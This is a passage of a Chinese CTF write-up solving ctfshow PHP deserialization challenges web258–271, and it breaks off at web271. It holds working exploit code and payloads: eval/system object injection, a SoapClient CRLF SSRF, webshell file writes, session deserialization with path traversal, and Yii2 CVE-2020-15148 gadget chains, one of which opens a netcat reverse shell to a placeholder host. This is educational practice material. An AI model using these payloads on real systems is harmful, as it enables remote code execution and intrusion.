$user-&gt;login($username,$password);&#125;</code></pre><p>加了个过滤：<code>/[oc]:\d+:/i</code><br>过滤出：<code>o/c:数字</code><br>可以使用加号过滤：<code>o:+</code></p><pre class="language-php" data-language="php"><code class="language-php">class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;false;    public $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new backDoor();    &#125;&#125;class backDoor&#123;    public $code &#x3D; &quot;system(&#39;tac f*&#39;);&quot;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a &#x3D; new ctfShowUser();$c &#x3D; str_replace(&quot;O:&quot;, &quot;O:+&quot;, serialize($a));echo &quot;&lt;br&gt;&quot;.$c;echo &quot;&lt;br&gt;user&#x3D;&quot;.urlencode($c);</code></pre><pre class="language-php" data-language="php"><code class="language-php">user&#x3D;O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%27tac+f%2A%27%29%3B%22%3B%7D%7D</code></pre><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><blockquote><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a><br><a href="https://www.cnblogs.com/studyskill/p/6972576.html">https://www.cnblogs.com/studyskill/p/6972576.html</a><br><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p></blockquote><h3 id="SoapCLient-CRLF"><a href="#SoapCLient-CRLF" class="headerlink" title="SoapCLient+CRLF"></a>SoapCLient+CRLF</h3><p>这怎么一下子升维了？</p><pre class="language-php" data-language="php"><code class="language-php">$xff &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);array_pop($xff);$ip &#x3D; array_pop($xff);if($ip!&#x3D;&#x3D;&#39;127.0.0.1&#39;)&#123;die(&#39;error&#39;);&#125;else&#123;$token &#x3D; $_POST[&#39;token&#39;];if($token&#x3D;&#x3D;&#39;ctfshow&#39;)&#123;file_put_contents(&#39;flag.txt&#39;,$flag);&#125;&#125;</code></pre><p>php中的连接web需要使用soapclient来连接。比较复杂，这里直接借用个脚本：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&#39;;$post_string &#x3D; &#39;token&#x3D;ctfshow&#39;;$headers &#x3D; array(    &#39;X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1&#39;,    &#39;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#39;);$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;yn8rt^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));$aaa &#x3D; serialize($b);$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo urlencode($aaa);?&gt;    &#x2F;&#x2F;运行结果O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A235%3A%22yn8rt%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>传参之后访问flag.txt即可<br>没看懂的建议直接看：<br><a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a></p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><p>查询出题精神状态，怎么一下子又这么简单。</p><pre class="language-php" data-language="php"><code class="language-php">if(preg_match(&#39;&#x2F;ctfshow_i_love_36D&#x2F;&#39;,serialize($_GET[&#39;ctfshow&#39;])))&#123;    echo $flag;&#125;</code></pre><pre class="language-php" data-language="php"><code class="language-php">class ctf &#123;    public $c &#x3D; &#39;ctfshow_i_love_36D&#39;;&#125;$a &#x3D; serialize(new ctf());echo urlencode($a);</code></pre><pre class="language-php" data-language="php"><code class="language-php">?ctfshow&#x3D;O%3A3%3A%22ctf%22%3A1%3A%7Bs%3A1%3A%22c%22%3Bs%3A18%3A%22ctfshow_i_love_36D%22%3B%7D</code></pre><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><h3 id="unserialize-和wakeup"><a href="#unserialize-和wakeup" class="headerlink" title="__unserialize()和wakeup()"></a>__unserialize()和wakeup()</h3><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username&#x3D;$u;        $this-&gt;password&#x3D;$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!&#x3D;&#39;&#39; || $this-&gt;password!&#x3D;&#39;&#39;)&#123;            die(&#39;error&#39;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username&#x3D;&#39;&#39;;        $this-&gt;password&#x3D;&#39;&#39;;    &#125;      public function __unserialize($data)&#123;        $this-&gt;username&#x3D;$data[&#39;username&#39;];        $this-&gt;password&#x3D;$data[&#39;password&#39;];        $this-&gt;code &#x3D; $this-&gt;username.$this-&gt;password;    &#125;      public function __destruct()&#123;        if($this-&gt;code&#x3D;&#x3D;0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    &#125;&#125;unserialize($_GET[&#39;vip&#39;]);</code></pre><p><strong>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，</strong><br><strong>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</strong><br>其中注意一下几个：</p><ul><li><code>__wakeup()</code> 反序列化之后立刻调用</li><li><code>__invoke()</code> 当作方法调用对象</li><li><code>__sleep()</code> 反序列化之前运行</li></ul><p>invoke似乎进不去，这里利用弱比较拼接。0x36d对应的十进制是877.<br>由于弱比较的原因username传入877.php 再在password中加入shell即可。</p><pre class="language-php" data-language="php"><code class="language-php">class ctfshowvip&#123;    public $username &#x3D; &quot;877.php&quot;;    public $password &#x3D; &#39;&lt;?php eval($_GET[1]);?&gt;&#39;;    public $code;&#125;echo &quot;\n&quot;.serialize(new ctfshowvip());</code></pre><p>然后访问<code>877.php</code>然后传入shell：<br><code>/877.php?1=system(&#39;cat /flag_is_here&#39;);</code></p><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><h3 id="经典字符串逃逸-增长版"><a href="#经典字符串逃逸-增长版" class="headerlink" title="经典字符串逃逸-增长版"></a>经典字符串逃逸-增长版</h3><pre class="language-php" data-language="php"><code class="language-php">&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 02:37:19# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);class message&#123;    public $from;    public $msg;    public $to;    public $token&#x3D;&#39;user&#39;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from &#x3D; $f;        $this-&gt;msg &#x3D; $m;        $this-&gt;to &#x3D; $t;    &#125;&#125;$f &#x3D; $_GET[&#39;f&#39;];$m &#x3D; $_GET[&#39;m&#39;];$t &#x3D; $_GET[&#39;t&#39;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;    $msg &#x3D; new message($f,$m,$t);    $umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));    setcookie(&#39;msg&#39;,base64_encode($umsg));    echo &#39;Your message has been sent&#39;;&#125;highlight_file(__FILE__);</code></pre><p>这里提示了还有一个message.php</p><pre class="language-php" data-language="php"><code class="language-php">class message&#123;    public $from;    public $msg;    public $to;    public $token&#x3D;&#39;user&#39;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from &#x3D; $f;        $this-&gt;msg &#x3D; $m;        $this-&gt;to &#x3D; $t;    &#125;&#125;if(isset($_COOKIE[&#39;msg&#39;]))&#123;    $msg &#x3D; unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));    if($msg-&gt;token&#x3D;&#x3D;&#39;admin&#39;)&#123;        echo $flag;    &#125;&#125;</code></pre><p>那就是要将user转换为admin。那么先查看标准的结果：</p><pre class="language-php" data-language="php"><code class="language-php">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;1&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre><p>直接在t末尾修改：<br>将t修改为以下内容：</p><pre class="language-php" data-language="php"><code class="language-php">&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>一个转换就能多容纳一个位置，那么26个字符需要添加27个fuck。<br>然后就使用payload：</p><pre class="language-php" data-language="php"><code class="language-php">?f&#x3D;1&amp;m&#x3D;1&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>然后访问message.php即可获取到flag</p><h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request_id%22:%22160775411819724848183660%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=160775411819724848183660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2118.3001.4450">https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc&#x3D;%7B%22request%5Fid%22%3A%22160775411819724848183660%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id&#x3D;160775411819724848183660&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&amp;utm_term&#x3D;session&amp;spm&#x3D;1018.2118.3001.4450</a> session<br><a href="https://www.jb51.net/article/116246.htm">https://www.jb51.net/article/116246.htm</a> session</p></blockquote><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p><a href="http://www.zip文件泄露/">www.zip文件泄露</a></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0);ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);date_default_timezone_set(&quot;Asia&#x2F;Shanghai&quot;);session_start();use \CTFSHOW\CTFSHOW; require_once &#39;CTFSHOW.php&#39;;$db &#x3D; new CTFSHOW([    &#39;database_type&#39; &#x3D;&gt; &#39;mysql&#39;,    &#39;database_name&#39; &#x3D;&gt; &#39;web&#39;,    &#39;server&#39; &#x3D;&gt; &#39;localhost&#39;,    &#39;username&#39; &#x3D;&gt; &#39;root&#39;,    &#39;password&#39; &#x3D;&gt; &#39;root&#39;,    &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;,    &#39;port&#39; &#x3D;&gt; 3306,    &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,    &#39;option&#39; &#x3D;&gt; [        PDO::ATTR_CASE &#x3D;&gt; PDO::CASE_NATURAL    ]]);&#x2F;&#x2F; sql注入检查function checkForm($str)&#123;    if(!isset($str))&#123;        return true;    &#125;else&#123;    return preg_match(&quot;&#x2F;select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\&#96;|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\&#x3D;|\[|\]|\;|\:|\&#39;|\&quot;|\&lt;|\,|\&gt;|\?&#x2F;i&quot;,$str);    &#125;&#125;class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status&#x3D;$s;    &#125;    function __destruct()&#123;        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#39;Y-m-d H:i:s&#39;));    &#125;&#125;&#x2F;*生成唯一标志*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)*&#x2F;function  uuid()  &#123;      $chars &#x3D; md5(uniqid(mt_rand(), true));      $uuid &#x3D; substr ( $chars, 0, 8 ) . &#39;-&#39;            . substr ( $chars, 8, 4 ) . &#39;-&#39;             . substr ( $chars, 12, 4 ) . &#39;-&#39;            . substr ( $chars, 16, 4 ) . &#39;-&#39;            . substr ( $chars, 20, 12 );      return $uuid ;  &#125;  </code></pre><p>inc.php中有file_put_contents函数</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);session_start();&#x2F;&#x2F;超过5次禁止登陆if(isset($_SESSION[&#39;limit&#39;]))&#123;$_SESSION[&#39;limti&#39;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#39;limit&#39;]&#x3D;base64_decode($_COOKIE[&#39;limit&#39;]);$_COOKIE[&#39;limit&#39;] &#x3D; base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) +1);&#125;else&#123; setcookie(&quot;limit&quot;,base64_encode(&#39;1&#39;));&#x2F;&#x2F;  $_SESSION[&#39;limit&#39;]&#x3D; 1;&#125;?&gt;</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);require_once &#39;inc&#x2F;inc.php&#39;;$GET &#x3D; array(&quot;u&quot;&#x3D;&gt;$_GET[&#39;u&#39;],&quot;pass&quot;&#x3D;&gt;$_GET[&#39;pass&#39;]);if($GET)&#123;$data&#x3D; $db-&gt;get(&#39;admin&#39;,[&#39;id&#39;,&#39;UserName0&#39;],[&quot;AND&quot;&#x3D;&gt;[&quot;UserName0[&#x3D;]&quot;&#x3D;&gt;$GET[&#39;u&#39;],&quot;PassWord1[&#x3D;]&quot;&#x3D;&gt;$GET[&#39;pass&#39;] &#x2F;&#x2F;密码必须为128位大小写字母+数字+特殊符号，防止爆破]]);if($data[&#39;id&#39;])&#123;&#x2F;&#x2F;登陆成功取消次数累计$_SESSION[&#39;limit&#39;]&#x3D; 0;echo json_encode(array(&quot;success&quot;,&quot;msg&quot;&#x3D;&gt;&quot;欢迎您&quot;.$data[&#39;UserName0&#39;]));&#125;else&#123;&#x2F;&#x2F;登陆失败累计次数加1$_COOKIE[&#39;limit&#39;] &#x3D; base64_encode(base64_decode($_COOKIE[&#39;limit&#39;])+1);echo json_encode(array(&quot;error&quot;,&quot;msg&quot;&#x3D;&gt;&quot;登陆失败&quot;));&#125;&#125;</code></pre><p>index.php就是登录页面、check.php进行次数检测。whatweb检测一下php版本是7.3.11<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690621414307-0b75bbfc-20e6-46df-9214-207db020284a.png" alt="image.png"><br>session.serialize_handler( 5.5.4前默认是php；5.5.4后改为php_serialize)存在以下几种：</p><ul><li>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li>php 键名+竖线（|）+经过serialize()函数处理过的值</li><li>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</li></ul><p>php处理器而不是php_serialize处理器，所以存在session反序列漏洞.<br>在 php_serialize 引擎下，session文件中存储的数据为:</p><pre class="language-php" data-language="php"><code class="language-php">a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code></pre><p>php 引擎下文件内容为:</p><pre class="language-php" data-language="php"><code class="language-php">name|s:6:&quot;spoock&quot;;</code></pre><p>exp：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User&#123;    public $username&#x3D;&quot;admin&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;;    public $password&#x3D;&quot;&lt;?php system(&#39;cat flag.php&#39;);?&gt;&quot;;    public $status;&#125;$a &#x3D; new User();$c &#x3D;  &quot;|&quot;.serialize($a);echo urlencode(base64_encode($c));</code></pre><p>这里说一下操作步骤。</p><ol><li>先访问页面，获取到cookie和session。</li><li>运行exp，将反序列化字符放入cookie中limit</li><li>访问check.php</li><li>访问1.php</li></ol><h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_COOKIE[&#39;msg&#39;]))&#123;    $msg &#x3D; unserialize(base64_decode($_SESSION[&#39;msg&#39;]));    if($msg-&gt;token&#x3D;&#x3D;&#39;admin&#39;)&#123;        echo $flag;    &#125;&#125;</code></pre><p>和上一个逃逸差别是在访问message.php时需要在cookie中添加msg的参数作为session，值并没有要求。</p><pre class="language-php" data-language="php"><code class="language-php">?f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>然后再message.php传入一个cookie值为msg&#x3D;1<br>以上是wp中所说的步骤，但是这里我无论如何执行都是<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690625827239-a0c8c2ad-a4e6-4578-a9d1-21a26204f743.png" alt="image.png"><br>即使重新写payload也是相同结果。<br>最后修改好了，是因为我开了两个页面，第一个页面传出的session我没有交给第二个页面<code>message.php</code>导致不能得到回显，使用一个页面修改就好了。</p><h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h3 id="反序列化指针引用"><a href="#反序列化指针引用" class="headerlink" title="反序列化指针引用&amp;"></a>反序列化指针引用&amp;</h3><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);include(&#39;flag.php&#39;);highlight_file(__FILE__);class ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token&#x3D;$t;        $this-&gt;password &#x3D; $p;    &#125;    public function login()&#123;        return $this-&gt;token&#x3D;&#x3D;&#x3D;$this-&gt;password;    &#125;&#125;$ctfshow &#x3D; unserialize($_GET[&#39;ctfshow&#39;]);$ctfshow-&gt;token&#x3D;md5(mt_rand());&#x2F;&#x2F;生成随机数if($ctfshow-&gt;login())&#123;    echo $flag;&#125;</code></pre><h2 id="引用传值"><a href="#引用传值" class="headerlink" title="引用传值"></a>引用传值</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass abc&#123;    public $a &#x3D; &#39;1&#39;;    public $b &#x3D; &#39;2&#39;;&#125;$c &#x3D; new abc();$c-&gt;a &#x3D;&amp;$c-&gt;b;$c-&gt;a &#x3D; &#39;1&#39;;&#x2F;&#x2F;此时哪怕修改a的值也不管用$c-&gt;b &#x3D; md5(mt_rand());print_r($c-&gt;a);?&gt;&#x2F;&#x2F;运行结果cc459dba9ce1830f72c80ba14532bbac</code></pre><p>exp：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass ctfshowAdmin&#123;    public $token&#x3D;1;    public $password&#x3D;1;&#125;$a &#x3D; new ctfshowAdmin();$a-&gt;password&#x3D;&amp;$a-&gt;token;&#x2F;&#x2F;让passwd的值随token变echo serialize($a);&#x2F;&#x2F;运行结果O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1;s:8:&quot;password&quot;;R:2;&#125;</code></pre><h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h3 id="php对类名大小写不敏感"><a href="#php对类名大小写不敏感" class="headerlink" title="php对类名大小写不敏感"></a>php对类名大小写不敏感</h3><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&#39;flag.php&#39;);$cs &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);class ctfshow&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public function __construct($u,$p)&#123;        $this-&gt;username&#x3D;$u;        $this-&gt;password&#x3D;$p;    &#125;    public function login()&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$this-&gt;password;    &#125;    public function __toString()&#123;        return $this-&gt;username;    &#125;    public function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;$ctfshowo&#x3D;@unserialize($cs);if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $cs))&#123;    throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125;</code></pre><p>出现ctfshow就会抛出异常，就不能触发__destruct方法，因此使用大写就行。</p><ul><li>区分大小写的： 变量名、常量名、数组索引（键名key）</li><li>不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</li></ul><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Ctfshow&#123;&#125;;$a &#x3D; new Ctfshow();echo serialize($a);?&gt;&#x2F;&#x2F;O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></pre><p>这里的的使用方法挺神奇：<br>在hackbar不知道为什么传不进去post请求体，用bp抓包就行了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690624961632-8d70a56c-bd65-4a35-87d1-0bb968ead848.png" alt="image.png"></p><h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><h3 id="CVE-2020-15148-Yii2反序列化漏洞"><a href="#CVE-2020-15148-Yii2反序列化漏洞" class="headerlink" title="CVE-2020-15148 Yii2反序列化漏洞"></a>CVE-2020-15148 Yii2反序列化漏洞</h3><p>后面一堆操作有点没看懂。一查发现是一个漏洞：</p><blockquote><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren&#x2F;article&#x2F;details&#x2F;111259943</a></p></blockquote><p>admin admin弱口令密码登录，在about页面查看源代码会发现：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;!--?view-source --&gt;</code></pre><p>但是这里我一点击about就会退出admin状态。可能是某个地方出了问题，不重要。<br>访问：<code>/index.php?r=site%2Fabout&amp;view-source</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690626931485-6d460a9f-e967-42e5-9521-993e2781c164.png" alt="image.png"><br>提示：</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;&#x2F;backdoor&#x2F;shellunserialize(base64_decode($_GET[&#39;code&#39;]))</code></pre><p>直接用网上的poc：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace yii\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess &#x3D; &#39;exec&#39;;&#x2F;&#x2F;PHP函数            $this-&gt;id &#x3D; &#39;cat &#x2F;flag &gt;2.txt&#39;;    &#x2F;&#x2F;PHP函数的参数          &#125;    &#125;&#125;namespace Faker &#123;    use yii\rest\IndexAction;    class Generator    &#123;        protected $formatters;        public function __construct()        &#123;            $this-&gt;formatters[&#39;close&#39;] &#x3D; [new IndexAction(), &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()        &#123;            $this-&gt;_dataReader&#x3D;new Generator();        &#125;    &#125;&#125;namespace&#123;    use yii\db\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?r&#x3D;backdoor&#x2F;shell&amp;code&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</code></pre><p>然后访问根目录下的2.txt即可</p><h1 id="web268-269"><a href="#web268-269" class="headerlink" title="web268-269"></a>web268-269</h1><h3 id="CVE-2020-15148-Yii2反序列化漏洞-1"><a href="#CVE-2020-15148-Yii2反序列化漏洞-1" class="headerlink" title="CVE-2020-15148 Yii2反序列化漏洞"></a>CVE-2020-15148 Yii2反序列化漏洞</h3><p>类似但是需要改改poc，因为有过滤：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace yii\rest &#123;    class Action    &#123;        public $checkAccess;    &#125;    class IndexAction    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;checkAccess &#x3D; $func;            $this-&gt;id &#x3D; $param;        &#125;    &#125;&#125;namespace yii\web &#123;    abstract class MultiFieldSession    &#123;        public $writeCallback;    &#125;    class DbSession extends MultiFieldSession    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;writeCallback &#x3D; [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];        &#125;    &#125;&#125;namespace yii\db &#123;    use yii\base\BaseObject;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct($func, $param)        &#123;            $this-&gt;_dataReader &#x3D; new \yii\web\DbSession($func, $param);        &#125;    &#125;&#125;namespace &#123;    $exp &#x3D; new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;cp &#x2F;f* 1.txt&#39;); &#x2F;&#x2F;此处写命令    echo(base64_encode(serialize($exp)));&#125;</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?r&#x3D;backdoor&#x2F;shell&amp;code&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0&#x3D;</code></pre><h1 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h1><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpnamespace yii\rest &#123;    class Action    &#123;        public $checkAccess;    &#125;    class IndexAction    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;checkAccess &#x3D; $func;            $this-&gt;id &#x3D; $param;        &#125;    &#125;&#125;namespace yii\web &#123;    abstract class MultiFieldSession    &#123;        public $writeCallback;    &#125;    class DbSession extends MultiFieldSession    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;writeCallback &#x3D; [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];        &#125;    &#125;&#125;namespace yii\db &#123;    use yii\base\BaseObject;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct($func, $param)        &#123;            $this-&gt;_dataReader &#x3D; new \yii\web\DbSession($func, $param);        &#125;    &#125;&#125;namespace &#123;    $exp &#x3D; new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;nc xxx.xxx.xxx.xxx 4567 -e &#x2F;bin&#x2F;sh&#39;);    echo(base64_encode(serialize($exp)));&#125;</code></pre><p>反弹一下即可，攻击机：</p><pre class="language-php" data-language="php"><code class="language-php">nc -lvvp 端口号</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690628634956-c431daf0-409d-44ba-b40f-75d327b056de.png" alt="image.png"></p><h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><blockquote><p><a href="https://github.com/laravel/laravel/tree/5.7">https://github.com/laravel/laravel/tree/5.7</a> laravel5.7</p></blockquote><h3 id="laravel5-7反序列化漏洞"><a href="#laravel5-7反序列化漏洞" class="headerlink" 